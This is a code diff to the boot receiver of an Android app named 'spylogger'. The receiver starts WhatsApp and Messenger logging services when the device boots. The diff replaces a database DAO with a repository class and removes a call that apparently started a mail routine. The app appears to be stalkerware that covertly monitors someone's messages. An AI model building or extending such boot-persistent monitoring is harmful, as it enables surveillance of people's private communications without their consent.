@@ -4,12 +4,11 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 
-import com.gravatasufoca.spylogger.utils.Utils;
-import com.gravatasufoca.spylogger.dao.DatabaseHelper;
-import com.gravatasufoca.spylogger.services.MessengerService;
 import com.gravatasufoca.spylogger.model.Configuracao;
+import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
+import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
+import com.gravatasufoca.spylogger.services.MessengerService;
 import com.gravatasufoca.spylogger.services.WhatsAppService;
-import com.j256.ormlite.dao.Dao;
 
 import java.sql.SQLException;
 
@@ -20,9 +19,9 @@ public class BootStarter extends BroadcastReceiver {
 	public void onReceive(Context context, Intent intent) {
 
 		try {
-			Dao<Configuracao, Integer> dao= (new DatabaseHelper(context)).getConfiguracaoDao();
+			RepositorioConfiguracao repositorioConfiguracao=new RepositorioConfiguracaoImpl(context);
 
-			Configuracao configuracao= dao.queryForAll().get(0);
+			Configuracao configuracao= repositorioConfiguracao.getConfiguracao();
 			boolean check=false;
 			if(configuracao.isWhatsApp()){
 				Intent myIntent = new Intent(context, WhatsAppService.class);
@@ -36,9 +35,7 @@ public class BootStarter extends BroadcastReceiver {
 				check=true;
 			}
 
-			if(check){
-				Utils.startMail(context);
-			}
+
 
 		} catch (SQLException e) {
 			e.printStackTrace();
